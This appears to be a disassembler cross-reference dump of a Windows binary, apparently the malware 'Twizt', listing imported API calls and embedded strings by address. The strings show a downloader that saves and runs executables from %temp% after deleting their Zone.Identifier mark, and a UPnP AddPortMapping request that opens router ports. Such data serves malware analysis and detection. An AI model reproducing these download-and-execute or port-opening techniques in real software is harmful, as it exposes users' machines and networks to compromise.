reference_vaddr	symbol_addr	symbol_type	caller_function	data
0x40928a	0x40f104	import	0x4091f0	KERNEL32.dll.MapViewOfFile
0x40929f	0x40f100	import	0x4091f0	KERNEL32.dll.GetFileSize
0x409305	0x40f108	import	0x4091f0	KERNEL32.dll.UnmapViewOfFile
0x40930f	0x40f128	import	0x4091f0	KERNEL32.dll.CloseHandle
0x409319	0x40f128	import	0x4091f0	KERNEL32.dll.CloseHandle
0x4093b7	0x40ff94	string	0x409370	twizt)
0x4093bc	0x40f0d4	import	0x409370	KERNEL32.dll.lstrlenA
0x4093c3	0x40ff9c	string	0x409370	twizt)
0x4095f9	0x40ffa4	string	0x4095e0	twizt)
0x4095fe	0x40f0d4	import	0x4095e0	KERNEL32.dll.lstrlenA
0x409605	0x40ffac	string	0x4095e0	twizt)
0x409d33	0x40f00c	import	0x409d20	ADVAPI32.dll.CryptAcquireContextW
0x409d49	0x40f004	import	0x409d20	ADVAPI32.dll.CryptGenRandom
0x409d55	0x40f008	import	0x409d20	ADVAPI32.dll.CryptReleaseContext
0x40a71e	0x40f0d4	import	0x40a710	KERNEL32.dll.lstrlenA
0x40a73d	0x40f0f4	import	0x40a710	KERNEL32.dll.MultiByteToWideChar
0x40a785	0x40f0d4	import	0x40a770	KERNEL32.dll.lstrlenA
0x40a7d5	0x40f0d4	import	0x40a7c0	KERNEL32.dll.lstrlenA
0x40a862	0x40f1b8	import	0x40a830	USER32.dll.wvsprintfA
0x40a9cf	0x40f214	import	0x40a9b0	WS2_32.dll.send
0x40aa82	0x40f0e0	import	0x40aa70	KERNEL32.dll.GetTickCount
0x40aaa8	0x40f220	import	0x40aa70	WS2_32.dll.ioctlsocket
0x40aadf	0x40f21c	import	0x40aa70	WS2_32.dll.recv
0x40aaf4	0x40f0e0	import	0x40aa70	KERNEL32.dll.GetTickCount
0x40ab14	0x40f0e8	import	0x40aa70	KERNEL32.dll.Sleep
0x40ab1a	0x40f0e0	import	0x40aa70	KERNEL32.dll.GetTickCount
0x40ab53	0x40f254	import	0x40ab40	WS2_32.dll.socket
0x40ab85	0x40f248	import	0x40ab40	WS2_32.dll.htons
0x40ab9f	0x40f23c	import	0x40ab40	WS2_32.dll.connect
0x40ac3c	0x40f048	import	0x40ac30	KERNEL32.dll.InterlockedExchangeAdd
0x40ac6b	0x40f04c	import	0x40ac30	KERNEL32.dll.InterlockedIncrement
0x40ad5b	0x40f058	import	0x40ac30	KERNEL32.dll.InterlockedDecrement
0x40addc	0x40f054	import	0x40adb0	KERNEL32.dll.WaitForSingleObject
0x40aebf	0x40f04c	import	0x40ae60	KERNEL32.dll.InterlockedIncrement
0x40aef2	0x40f058	import	0x40ae60	KERNEL32.dll.InterlockedDecrement
0x40afdf	0x40f054	import	0x40afb0	KERNEL32.dll.WaitForSingleObject
0x40b01e	0x40f110	import	0x40b000	KERNEL32.dll.InitializeCriticalSection
0x40b070	0x40f054	import	0x40b030	KERNEL32.dll.WaitForSingleObject
0x40b089	0x40f128	import	0x40b030	KERNEL32.dll.CloseHandle
0x40b0d4	0x40f120	import	0x40b0b0	KERNEL32.dll.EnterCriticalSection
0x40b12f	0x40f088	import	0x40b0b0	KERNEL32.dll.CreateThread
0x40b16c	0x40f044	import	0x40b0b0	KERNEL32.dll.GetCurrentProcess
0x40b177	0x40f044	import	0x40b0b0	KERNEL32.dll.GetCurrentProcess
0x40b17e	0x40f030	import	0x40b0b0	KERNEL32.dll.DuplicateHandle
0x40b192	0x40f114	import	0x40b0b0	KERNEL32.dll.LeaveCriticalSection
0x40b1a6	0x40f040	import	0x40b1a0	KERNEL32.dll.GetCurrentThread
0x40b1ad	0x40f038	import	0x40b1a0	KERNEL32.dll.GetThreadPriority
0x40b1b8	0x40f040	import	0x40b1a0	KERNEL32.dll.GetCurrentThread
0x40b1bf	0x40f03c	import	0x40b1a0	KERNEL32.dll.SetThreadPriority
0x40b1e2	0x40f048	import	0x40b1a0	KERNEL32.dll.InterlockedExchangeAdd
0x40b217	0x40f120	import	0x40b1a0	KERNEL32.dll.EnterCriticalSection
0x40b262	0x40f054	import	0x40b1a0	KERNEL32.dll.WaitForSingleObject
0x40b27e	0x40f114	import	0x40b1a0	KERNEL32.dll.LeaveCriticalSection
0x40b2ae	0x40f0e8	import	0x40b1a0	KERNEL32.dll.Sleep
0x40b2bd	0x40f040	import	0x40b1a0	KERNEL32.dll.GetCurrentThread
0x40b2c4	0x40f03c	import	0x40b1a0	KERNEL32.dll.SetThreadPriority
0x40b2f9	0x40f120	import	0x40b2e0	KERNEL32.dll.EnterCriticalSection
0x40b328	0x40f128	import	0x40b2e0	KERNEL32.dll.CloseHandle
0x40b337	0x40f114	import	0x40b2e0	KERNEL32.dll.LeaveCriticalSection
0x40b344	0x40f034	import	0x40b2e0	KERNEL32.dll.DeleteCriticalSection
0x40b37a	0x40f2b0	import	0x40b370	ntdll.dll.NtQuerySystemTime
0x40b388	0x40f2ac	import	0x40b370	ntdll.dll.RtlTimeToSecondsSince1980
0x40b44e	0x40f048	import	0x40b420	KERNEL32.dll.InterlockedExchangeAdd
0x40b498	0x40f054	import	0x40b420	KERNEL32.dll.WaitForSingleObject
0x40b4e6	0x40b501	string	0x40b4c0	_^[]
0x40b4f0	0x40f054	import	0x40b4c0	KERNEL32.dll.WaitForSingleObject
0x40b53e	0x40f14c	import	0x40b510	OLEAUT32.dll.SysReAllocString
0x40b566	0x40f2d8	import	0x40b510	ole32.dll.CoCreateInstance
0x40b601	0x40f148	import	0x40b510	OLEAUT32.dll.SysStringLen
0x40b6cb	0x40f0bc	import	0x40b620	KERNEL32.dll.lstrcmpiW
0x40b6df	0x40f148	import	0x40b620	OLEAUT32.dll.SysStringLen
0x40b7e8	0x40f1fc	import	0x40b770	WININET.dll.InternetCrackUrlA
0x40b7f8	0x40f1e8	import	0x40b770	WININET.dll.InternetOpenA
0x40b831	0x40f1f8	import	0x40b770	WININET.dll.InternetConnectA
0x40b867	0x40f1f4	import	0x40b770	WININET.dll.HttpOpenRequestA
0x40b88f	0x40f1ec	import	0x40b770	WININET.dll.HttpSendRequestA
0x40b8d8	0x40f1d8	import	0x40b770	WININET.dll.InternetReadFile
0x40b967	0x40f1e4	import	0x40b770	WININET.dll.InternetCloseHandle
0x40b974	0x40f1e4	import	0x40b770	WININET.dll.InternetCloseHandle
0x40b981	0x40f1e4	import	0x40b770	WININET.dll.InternetCloseHandle
0x40b9ee	0x40f204	import	0x40b9a0	WS2_32.dll.recvfrom
0x40b9fe	0x40f0e8	import	0x40b9a0	KERNEL32.dll.Sleep
0x40ba0f	0x40f4c8	string	0x40b9a0	HTTP/1.1 200 OK
0x40ba1b	0x40f178	import	0x40b9a0	SHLWAPI.dll.StrCmpNIA
0x40ba25	0x40f4d8	string	0x40b9a0	LOCATION:
0x40ba31	0x40f170	import	0x40b9a0	SHLWAPI.dll.StrStrIA
0x40ba5e	0x40f174	import	0x40b9a0	SHLWAPI.dll.StrChrA
0x40baaa	0x40f254	import	0x40ba90	WS2_32.dll.socket
0x40bae0	0x40f248	import	0x40ba90	WS2_32.dll.htons
0x40baea	0x40f4e4	string	0x40ba90	239.255.255.250
0x40baef	0x40f244	import	0x40ba90	WS2_32.dll.inet_addr
0x40bb0d	0x40f208	import	0x40ba90	WS2_32.dll.setsockopt
0x40bb43	0x40f210	import	0x40ba90	WS2_32.dll.bind
0x40bb49	0x40f500	string	0x40ba90	M-SEARCH * HTTP/1.1\r\nST:urn:schemas-upnp-org:device:InternetGatewayDevice:1\r\nMX: 3\r\nMan:"ssdp:discover"\r\nHOST: 239.255.255.250:1900\r\n\r\n
0x40bb5c	0x40f0d4	import	0x40ba90	KERNEL32.dll.lstrlenA
0x40bb6b	0x40f20c	import	0x40ba90	WS2_32.dll.sendto
0x40bb85	0x40f220	import	0x40ba90	WS2_32.dll.ioctlsocket
0x40bcc3	0x40f588	string	0x40bc10	service
0x40bccc	0x40f0bc	import	0x40bc10	KERNEL32.dll.lstrcmpiW
0x40bcd6	0x40f598	string	0x40bc10	serviceType
0x40bd1b	0x40f0bc	import	0x40bc10	KERNEL32.dll.lstrcmpiW
0x40bd2f	0x40f148	import	0x40bc10	OLEAUT32.dll.SysStringLen
0x40bd47	0x40f148	import	0x40bc10	OLEAUT32.dll.SysStringLen
0x40bd7d	0x40f5b0	string	0x40bd70	serviceList
0x40bea3	0x40f5c8	string	0x40bdf0	device
0x40beac	0x40f0bc	import	0x40bdf0	KERNEL32.dll.lstrcmpiW
0x40beb6	0x40f5d8	string	0x40bdf0	deviceType
0x40befb	0x40f0bc	import	0x40bdf0	KERNEL32.dll.lstrcmpiW
0x40bf0f	0x40f148	import	0x40bdf0	OLEAUT32.dll.SysStringLen
0x40bf27	0x40f148	import	0x40bdf0	OLEAUT32.dll.SysStringLen
0x40bf5d	0x40f5f0	string	0x40bf50	deviceList
0x40bfdd	0x40f608	string	0x40bfd0	urn:schemas-upnp-org:device:InternetGatewayDevice:1
0x40bffb	0x40f670	string	0x40bfd0	urn:schemas-upnp-org:device:WANDevice:1
0x40c019	0x40f6c0	string	0x40bfd0	urn:schemas-upnp-org:device:WANConnectionDevice:1
0x40c037	0x40f760	string	0x40bfd0	urn:schemas-upnp-org:service:WANIPConnection:1
0x40c051	0x40f7c0	string	0x40bfd0	urn:schemas-upnp-org:service:WANPPPConnection:1
0x40c06b	0x40f820	string	0x40bfd0	controlURL
0x40c0fd	0x40f838	string	0x40c0f0	URLBase
0x40c206	0x40f848	string	0x40c140	%S%S
0x40c21b	0x40f148	import	0x40c140	OLEAUT32.dll.SysStringLen
0x40c225	0x40f148	import	0x40c140	OLEAUT32.dll.SysStringLen
0x40c2e8	0x40f1fc	import	0x40c270	WININET.dll.InternetCrackUrlA
0x40c2f6	0x40f850	string	0x40c270	Mozilla/4.0 (compatible; UPnP/1.0; Windows 9x)
0x40c2fb	0x40f1e8	import	0x40c270	WININET.dll.InternetOpenA
0x40c334	0x40f1f8	import	0x40c270	WININET.dll.InternetConnectA
0x40c35e	0x40f880	string	0x40c270	POST
0x40c36a	0x40f1f4	import	0x40c270	WININET.dll.HttpOpenRequestA
0x40c395	0x40f1f0	import	0x40c270	WININET.dll.HttpAddRequestHeadersA
0x40c39b	0x40f888	string	0x40c270	Content-Type: text/xml; charset="utf-8"\r\nConnection: Close\r\nCache-Control: no-cache\r\nPragma: no-cache\r\n
0x40c3bf	0x40f1ec	import	0x40c270	WININET.dll.HttpSendRequestA
0x40c3fe	0x40f1d8	import	0x40c270	WININET.dll.InternetReadFile
0x40c481	0x40f1e4	import	0x40c270	WININET.dll.InternetCloseHandle
0x40c48e	0x40f1e4	import	0x40c270	WININET.dll.InternetCloseHandle
0x40c49b	0x40f1e4	import	0x40c270	WININET.dll.InternetCloseHandle
0x40c4b6	0x40faa0	string	0x40c4b0	<?xml version="1.0"?>\r\n<SOAP-ENV:Envelope\r\n xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/"\r\n SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">\r\n<SOAP-ENV:Body>\r\n<m:AddPortMapping xmlns:m="urn:schemas-upnp-org:service:WANIPConnection:1">\r\n<NewRemoteHost></NewRemoteHost>\r\n<NewExternalPort>%d</NewExternalPort>\r\n<NewProtocol>%s</NewProtocol>\r\n<NewInternalPort>%d</NewInternalPort>\r\n<NewInternalClient>%s</NewInternalClient>\r\n<NewEnabled>1</NewEnabled>\r\n<NewPortMappingDescription></NewPortMappingDescription>\r\n<NewLeaseDuration>0</NewLeaseDuration>\r\n</m:AddPortMapping>\r\n</SOAP-ENV:Body>\r\n</SOAP-ENV:Envelope>\r\n\r\n
0x40c4f9	0x40fd28	string	0x40c4b0	SOAPAction: "urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping"
0x40c53a	0x40f2d4	import	0x40c530	ole32.dll.CoInitializeEx
0x40c655	0x40f02c	import	0x40c600	KERNEL32.dll.CreateProcessW
0x40c665	0x40f0e8	import	0x40c600	KERNEL32.dll.Sleep
0x40c679	0x40f340	string	0x40c600	open
0x40c680	0x40f154	import	0x40c600	SHELL32.dll.ShellExecuteW
0x40c69a	0x40f0e8	import	0x40c600	KERNEL32.dll.Sleep
0x40c6b9	0x40f0e0	import	0x40c6b0	KERNEL32.dll.GetTickCount
0x40c6df	0x40f0e8	import	0x40c6b0	KERNEL32.dll.Sleep
0x40c6f8	0x40f34c	string	0x40c6b0	%temp%
0x40c6fd	0x40f084	import	0x40c6b0	KERNEL32.dll.ExpandEnvironmentStringsW
0x40c797	0x40f35c	string	0x40c6b0	%s\%d%d.exe
0x40c7a3	0x40f1a4	import	0x40c6b0	USER32.dll.wsprintfW
0x40c7b9	0x40f1e0	import	0x40c6b0	WININET.dll.InternetOpenW
0x40c7e8	0x40f1dc	import	0x40c6b0	WININET.dll.InternetOpenUrlW
0x40c817	0x40f118	import	0x40c6b0	KERNEL32.dll.CreateFileW
0x40c84a	0x40f1d8	import	0x40c6b0	WININET.dll.InternetReadFile
0x40c87b	0x40f10c	import	0x40c6b0	KERNEL32.dll.WriteFile
0x40c88a	0x40f128	import	0x40c6b0	KERNEL32.dll.CloseHandle
0x40c897	0x40f460	string	0x40c6b0	%s:Zone.Identifier
0x40c8a3	0x40f1a4	import	0x40c6b0	USER32.dll.wsprintfW
0x40c8b3	0x40f0b0	import	0x40c6b0	KERNEL32.dll.DeleteFileW
0x40c8d2	0x40f0e8	import	0x40c6b0	KERNEL32.dll.Sleep
0x40c8e6	0x40f128	import	0x40c6b0	KERNEL32.dll.CloseHandle
0x40c8f3	0x40f1e4	import	0x40c6b0	WININET.dll.InternetCloseHandle
0x40c900	0x40f1e4	import	0x40c6b0	WININET.dll.InternetCloseHandle
0x40c90b	0x40f0e8	import	0x40c6b0	KERNEL32.dll.Sleep
0x40c93b	0x40f488	string	0x40c6b0	%ls\%d.exe
0x40c947	0x40f1a4	import	0x40c6b0	USER32.dll.wsprintfW
0x40c974	0x40f4a0	string	0x40c6b0	%ls:Zone.Identifier
0x40c980	0x40f1a4	import	0x40c6b0	USER32.dll.wsprintfW
0x40c990	0x40f0b0	import	0x40c6b0	KERNEL32.dll.DeleteFileW
0x40c9e8	0x40f094	import	0x40c9b0	KERNEL32.dll.CreateEventA
0x40c9f7	0x40f254	import	0x40c9b0	WS2_32.dll.socket
0x40ca3a	0x40f248	import	0x40c9b0	WS2_32.dll.htons
0x40ca5c	0x40f208	import	0x40c9b0	WS2_32.dll.setsockopt
0x40ca6d	0x40f210	import	0x40c9b0	WS2_32.dll.bind
0x40ca95	0x40f088	import	0x40c9b0	KERNEL32.dll.CreateThread
0x40cafb	0x40cae8	string	0x40cab0	9\bu\nf
0x40cc0b	0x40f220	import	0x40cbe0	WS2_32.dll.ioctlsocket
0x40cc78	0x40f204	import	0x40cbe0	WS2_32.dll.recvfrom
0x40cc8e	0x40f048	import	0x40cbe0	KERNEL32.dll.InterlockedExchangeAdd
0x40ccaf	0x40f054	import	0x40cbe0	KERNEL32.dll.WaitForSingleObject
0x40cd60	0x40f248	import	0x40cce0	WS2_32.dll.htons
0x40cd88	0x40f20c	import	0x40cce0	WS2_32.dll.sendto
0x40cd9d	0x40f048	import	0x40cce0	KERNEL32.dll.InterlockedExchangeAdd
0x40ce21	0x40f0a8	import	0x40ce10	KERNEL32.dll.SetEvent
0x40ce2d	0x40f054	import	0x40ce10	KERNEL32.dll.WaitForSingleObject
0x40ce37	0x40f128	import	0x40ce10	KERNEL32.dll.CloseHandle
0x40cea5	0x40f094	import	0x40ce80	KERNEL32.dll.CreateEventA
0x40ceb4	0x40f254	import	0x40ce80	WS2_32.dll.socket
0x40cef5	0x40f210	import	0x40ce80	WS2_32.dll.bind
0x40cf21	0x40f088	import	0x40ce80	KERNEL32.dll.CreateThread
0x40cfca	0x40f120	import	0x40cfc0	KERNEL32.dll.EnterCriticalSection
0x40cfec	0x40f114	import	0x40cfc0	KERNEL32.dll.LeaveCriticalSection
0x40d0ba	0x40f120	import	0x40d0a0	KERNEL32.dll.EnterCriticalSection
0x40d0de	0x40f114	import	0x40d0a0	KERNEL32.dll.LeaveCriticalSection
0x40d127	0x40f26c	import	0x40d0a0	WS2_32.dll.getpeername
0x40d13b	0x40f0a4	import	0x40d0a0	KERNEL32.dll.CreateIoCompletionPort
0x40d150	0x40f050	import	0x40d0a0	KERNEL32.dll.InterlockedExchange
0x40d176	0x40f110	import	0x40d0a0	KERNEL32.dll.InitializeCriticalSection
0x40d180	0x40f04c	import	0x40d0a0	KERNEL32.dll.InterlockedIncrement
0x40d1cf	0x40f04c	import	0x40d1b0	KERNEL32.dll.InterlockedIncrement
0x40d20a	0x40f120	import	0x40d1f0	KERNEL32.dll.EnterCriticalSection
0x40d236	0x40f058	import	0x40d1f0	KERNEL32.dll.InterlockedDecrement
0x40d24e	0x40f048	import	0x40d1f0	KERNEL32.dll.InterlockedExchangeAdd
0x40d27c	0x40f04c	import	0x40d1f0	KERNEL32.dll.InterlockedIncrement
0x40d28c	0x40f058	import	0x40d1f0	KERNEL32.dll.InterlockedDecrement
0x40d2a4	0x40f114	import	0x40d1f0	KERNEL32.dll.LeaveCriticalSection
0x40d2ae	0x40f0a8	import	0x40d1f0	KERNEL32.dll.SetEvent
0x40d2bb	0x40f070	import	0x40d1f0	KERNEL32.dll.PostQueuedCompletionStatus
0x40d2ea	0x40f128	import	0x40d1f0	KERNEL32.dll.CloseHandle
0x40d300	0x40f224	import	0x40d1f0	WS2_32.dll.WSACloseEvent
0x40d316	0x40f034	import	0x40d1f0	KERNEL32.dll.DeleteCriticalSection
0x40d3a0	0x40f120	import	0x40d390	KERNEL32.dll.EnterCriticalSection
0x40d3b0	0x40f048	import	0x40d390	KERNEL32.dll.InterlockedExchangeAdd
0x40d3bd	0x40f114	import	0x40d390	KERNEL32.dll.LeaveCriticalSection
0x40d3f8	0x40f114	import	0x40d390	KERNEL32.dll.LeaveCriticalSection
0x40d436	0x40f048	import	0x40d410	KERNEL32.dll.InterlockedExchangeAdd
0x40d4a1	0x40f058	import	0x40d410	KERNEL32.dll.InterlockedDecrement
0x40d51c	0x40f0e0	import	0x40d510	KERNEL32.dll.GetTickCount
0x40d52f	0x40f054	import	0x40d510	KERNEL32.dll.WaitForSingleObject
0x40d549	0x40f268	import	0x40d510	WS2_32.dll.WSAWaitForMultipleEvents
0x40d566	0x40f234	import	0x40d510	WS2_32.dll.WSAEnumNetworkEvents
0x40d598	0x40f270	import	0x40d510	WS2_32.dll.accept
0x40d5e0	0x40f0e0	import	0x40d510	KERNEL32.dll.GetTickCount
0x40d5f9	0x40f120	import	0x40d510	KERNEL32.dll.EnterCriticalSection
0x40d61a	0x40f114	import	0x40d510	KERNEL32.dll.LeaveCriticalSection
0x40d62b	0x40f114	import	0x40d510	KERNEL32.dll.LeaveCriticalSection
0x40d642	0x40f120	import	0x40d510	KERNEL32.dll.EnterCriticalSection
0x40d655	0x40f048	import	0x40d510	KERNEL32.dll.InterlockedExchangeAdd
0x40d695	0x40f114	import	0x40d510	KERNEL32.dll.LeaveCriticalSection
0x40d69b	0x40f0e0	import	0x40d510	KERNEL32.dll.GetTickCount
0x40d6ab	0x40f054	import	0x40d510	KERNEL32.dll.WaitForSingleObject
0x40d6d1	0x40f22c	import	0x40d6d0	WS2_32.dll.WSASend
0x40d702	0x40f230	import	0x40d6d0	WS2_32.dll.WSAGetLastError
0x40d718	0x40f0e8	import	0x40d6d0	KERNEL32.dll.Sleep
0x40d7ed	0x40f120	import	0x40d750	KERNEL32.dll.EnterCriticalSection
0x40d810	0x40f114	import	0x40d750	KERNEL32.dll.LeaveCriticalSection
0x40d84a	0x40f228	import	0x40d840	WS2_32.dll.WSARecv
0x40d880	0x40f230	import	0x40d840	WS2_32.dll.WSAGetLastError
0x40d896	0x40f0e8	import	0x40d840	KERNEL32.dll.Sleep
0x40d8fd	0x40f048	import	0x40d8e0	KERNEL32.dll.InterlockedExchangeAdd
0x40d92b	0x40f04c	import	0x40d8e0	KERNEL32.dll.InterlockedIncrement
0x40d93d	0x40f058	import	0x40d8e0	KERNEL32.dll.InterlockedDecrement
0x40d976	0x40f050	import	0x40d950	KERNEL32.dll.InterlockedExchange
0x40d9a0	0x40f058	import	0x40d950	KERNEL32.dll.InterlockedDecrement
0x40d9b3	0x40f058	import	0x40d950	KERNEL32.dll.InterlockedDecrement
0x40d9c4	0x40f048	import	0x40d950	KERNEL32.dll.InterlockedExchangeAdd
0x40da4b	0x40f058	import	0x40d950	KERNEL32.dll.InterlockedDecrement
0x40da7b	0x40f058	import	0x40d950	KERNEL32.dll.InterlockedDecrement
0x40dae6	0x40f058	import	0x40d950	KERNEL32.dll.InterlockedDecrement
0x40db1c	0x40f208	import	0x40d950	WS2_32.dll.setsockopt
0x40db29	0x40f258	import	0x40d950	WS2_32.dll.closesocket
0x40dc33	0x40f06c	import	0x40dc10	KERNEL32.dll.GetSystemInfo
0x40dc47	0x40f110	import	0x40dc10	KERNEL32.dll.InitializeCriticalSection
0x40dc55	0x40f094	import	0x40dc10	KERNEL32.dll.CreateEventA
0x40dc6e	0x40f0a4	import	0x40dc10	KERNEL32.dll.CreateIoCompletionPort
0x40dc9b	0x40f278	import	0x40dc10	WS2_32.dll.WSASocketA
0x40dcc1	0x40f208	import	0x40dc10	WS2_32.dll.setsockopt
0x40dcf1	0x40f248	import	0x40dc10	WS2_32.dll.htons
0x40dd07	0x40f210	import	0x40dc10	WS2_32.dll.bind
0x40dd1f	0x40f27c	import	0x40dc10	WS2_32.dll.listen
0x40dd2a	0x40f274	import	0x40dc10	WS2_32.dll.WSACreateEvent
0x40dd3e	0x40f260	import	0x40dc10	WS2_32.dll.WSAEventSelect
0x40ddc2	0x40f2e8	import	0x40ddc2	urlmon.dll.URLDownloadToFileW
0x40ddc8	0x40f2c0	import	0x40ddc8	ntdll.dll.isalpha
0x40ddce	0x40f2bc	import	0x40ddce	ntdll.dll.isdigit
0x40ddd4	0x40f2b8	import	0x40ddd4	ntdll.dll.strstr
0x40ddda	0x40f2a4	import	0x40ddda	ntdll.dll.memmove
0x40dde0	0x40f2a8	import	0x40dde0	ntdll.dll.mbstowcs
0x40dde6	0x40f28c	import	0x40dde6	msvcrt.dll._vscprintf
0x40ddec	0x40f284	import	0x40ddec	msvcrt.dll.rand
0x40ddf2	0x40f288	import	0x40ddf2	msvcrt.dll.srand
0x40deb9	0x40dede	string	0x40de00	]_^[
0x40dec7	0x40dede	string	0x40de00	]_^[
0x40df02	0x40f2cc	import	0x40df02	ntdll.dll.memset
0x40df08	0x40f2c8	import	0x40df08	ntdll.dll._aullshr
0x40df0e	0x40f2c4	import	0x40df0e	ntdll.dll._allshl
0x40df14	0x40f294	import	0x40df14	ntdll.dll.memcpy
0x40df1a	0x40f298	import	0x40df1a	ntdll.dll._chkstk
0x40df20	0x40f29c	import	0x40df20	ntdll.dll._aulldiv
0x40df33	0x40df40	string	0x40df28	]_^[
0x40e07c	0x40e086	string	0x40e03d	3҉U\b blocks=Basic Latin,Cyrillic
0x40e217	0x40e20d	string	0x40e03d	90t\bJ
0x40e260	0x40f2a0	import	0x40e260	ntdll.dll.RtlUnwind
0x40e266	0x40f2b4	import	0x40e266	ntdll.dll.NtQueryVirtualMemory
